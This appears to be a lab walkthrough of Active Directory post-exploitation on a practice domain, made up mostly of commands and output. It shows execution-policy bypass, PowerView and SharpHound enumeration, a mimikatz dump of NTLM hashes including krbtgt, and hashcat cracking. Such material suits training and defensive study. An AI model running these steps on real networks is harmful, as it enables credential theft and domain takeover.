
# Enum w/ Powerview
[Cheatsheet Powerview](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
Powerview is a powershell script from pwshell empire can be used for enumerating a domain after you've already gained a shell in the system.
`P@$$W0rd`

* VICTIM
```powershell
cmd > powershell -ep bypass

PS C:\Users\Administrator> . .\Downloads\PowerView.ps1 

PS C:\Users\Administrator> Get-NetUser | select cn     
	cn                  
	--                  
	Administrator       
	Guest               
	krbtgt              
	Machine-1           
	Admin2              
	Machine-2           
	SQL Service         
	POST{P0W3RV13W_FTW} 
	sshd             
	
PS C:\Users\Administrator> Get-NetGroup -GroupName *admin*
	Administrators 
	Hyper-V Administrators
	Storage Replica Administrators
	Schema Admins
	Enterprise Admins
	Domain Admins 
	Key Admins
	Enterprise Key Admins
	DnsAdmins
	
PS C:\Users\Administrator> Invoke-ShareFinder		#Check shares
	\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin
	\\Domain-Controller.CONTROLLER.local\C$         - Default share
	\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
	\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
	\\Domain-Controller.CONTROLLER.local\Share      -
	\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share
	
PS C:\Users\Administrator> Get-NetComputer -fulldata | select operatingsystem		#Check OS
	operatingsystem
	---------------
	Windows Server 2019 Standard
	Windows 10 Enterprise Evaluation
	Windows 10 Enterprise Evaluation
```

---

# Enum w/ BloodHound
Bloodhound is a graphical interface that allows you to visually map out the network. This tool along with SharpHound which similar to PowerView takes the user, groups, trusts etc. of the network and collects them into .json files to be used inside of Bloodhound.

* VICTIM
```powershell
PS C:\Users\Administrator> . .\Downloads\SharpHound.ps1 
PS C:\Users\Administrator> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip 
	----------------------------------------------- 
	Initializing SharpHound at 3:00 AM on 5/13/2021
	-----------------------------------------------

	Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container 

	[+] Creating Schema map for domain CONTROLLER.LOCAL using path CN=Schema,CN=Configuration,DC=CONTROLLER,DC=LOCAL     
	PS C:\Users\Administrator> [+] Cache File not Found: 0 Objects in cache 

	[+] Pre-populating Domain Controller SIDS 
	Status: 0 objects finished (+0) -- Using 75 MB RAM 
	Status: 66 objects finished (+66 33)/s -- Using 81 MB RAM 
	Enumeration finished in 00:00:02.1749269
	Compressing data to C:\Users\Administrator\20210513030059_loot.zip 
	You can upload this file directly to the UI 

	SharpHound Enumeration Completed at 3:01 AM on 5/13/2021! Happy Graphing!
```

Download to local de loot.zip and drag & drop to bloodhound.

---

# Dumping hashes w/ mimikatz
Mimikatz is a very popular and powerful post-exploitation tool mainly used for dumping user credentials inside of a active directory network

* VICTIM
```powershell
mimikatz # privilege::debug - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator

mimikatz # lsadump::lsa /patch Dump those hashes!
	Domain : CONTROLLER / S-1-5-21-849420856-2351964222-986696166                                                                                                                                 
                                                                                                                                                                                              
	RID  : 000001f4 (500)                                                                                                                                                                         
	User : Administrator                                                                                                                                                                          
	LM   :                                                                                                                                                                                        
	NTLM : 2777b7fec870e04dda00cd7260f7bee6                                                                                                                                                       
                                                                                                                                                                                              
	RID  : 000001f5 (501)                                                                                                                                                                         
	User : Guest                                                                                                                                                                                  
	LM   :                                                                                                                                                                                        
	NTLM :                                                                                                                                                                                        
                                                                                                                                                                                              
	RID  : 000001f6 (502)                                                                                                                                                                         
	User : krbtgt                                                                                                                                                                                 
	LM   :                                                                                                                                                                                        
	NTLM : 5508500012cc005cf7082a9a89ebdfdf

	RID  : 0000044f (1103)
	User : Machine1
	LM   :
	NTLM : 64f12cddaa88057e06a81b54e73b949b

	RID  : 00000451 (1105)
	User : Admin2
	LM   :
	NTLM : 2b576acbe6bcfda7294d6bd18041b8fe

	RID  : 00000452 (1106)
	User : Machine2
	LM   :
	NTLM : c39f2beb3d2ec06a62cb887fb391dee0 
	
	RID  : 00000453 (1107)
	User : SQLService
	LM   :
	NTLM : f4ab68f27303bcb4024650d8fc5f973a 
	
	RID  : 00000454 (1108)
	User : POST
	LM   :
	NTLM : c4b0e1b10c7ce2c4723b4e2407ef81a2
	
	RID  : 00000457 (1111) 
	User : sshd
	LM   :
	NTLM : 2777b7fec870e04dda00cd7260f7bee6

	RID  : 000003e8 (1000)
	User : DOMAIN-CONTROLL$
	LM   :
	NTLM : 1c0640905c01ea2a6467ac54c4fb3476

	RID  : 00000455 (1109)
	User : DESKTOP-2$
	LM   :
	NTLM : 3c2d4759eb9884d7a935fe71a8e0f54c

	RID  : 00000456 (1110)
	User : DESKTOP-1$
	LM   :
	NTLM : 7d33346eeb11a4f12a6c201faaa0d89a

mimikatz # 
```

* ATTACKER
```bash
$ hashcat -m 1000 hash.txt rockyou.txt
```